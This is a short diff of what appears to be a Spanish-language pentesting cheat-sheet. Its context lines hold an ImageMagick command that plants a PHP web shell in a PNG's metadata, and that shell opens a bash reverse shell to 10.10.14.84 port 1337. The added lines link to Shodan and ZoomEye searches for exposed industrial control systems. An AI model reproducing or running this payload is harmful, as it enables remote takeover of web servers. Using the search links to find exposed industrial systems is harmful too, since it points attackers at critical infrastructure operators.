@@ -32,3 +32,11 @@ powershell -enc "base64"
 # creamos un png y lo llamamos con php por ejemplo
 convert xc:red -set 'Copyright' '<?php system("bash -i >& /dev/tcp/10.10.14.84/1337 0>&1"); ?>' payload.png
 ```
+
+```bash
+Sistemas de control industrial (scadan,pcl)
+
+https://github.com/jakejarvis/awesome-shodan-queries?tab=readme-ov-file#industrial-control-systems
+https://www.linkedin.com/pulse/ot-hunt-finding-icsot-zoomeye-sulaiman-alhasawi-ixvxf/
+
+```
